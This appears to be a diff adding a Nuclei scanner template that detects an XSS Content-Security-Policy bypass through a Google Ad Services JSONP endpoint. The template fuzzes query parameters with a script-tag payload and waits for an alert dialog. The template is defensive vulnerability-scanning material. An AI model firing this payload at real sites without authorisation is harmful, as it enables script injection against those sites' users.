@@ -1,0 +1,55 @@
+id: googleadservices-partner-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Google Ad Services Partner
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,googleadservices-partner,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "googleadservices.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: googleadservices_partner_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://partner.googleadservices.com/gampad/cookie.js?domain=x&callback=alert&client=ca-pub-3374367632700222"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "googleadservices_partner_csp_xss == true"
+# digest: 4a0a00473045022100f9af375259611d62dcd63501b3e721acc1bdd8f00d18ca862c49b379b8c143570220040622e7096b1a339cf4d2998e0979e80ea89b3b5c818dc3f79132a169447f44:922c64590222798bb761d5b6d8e72950
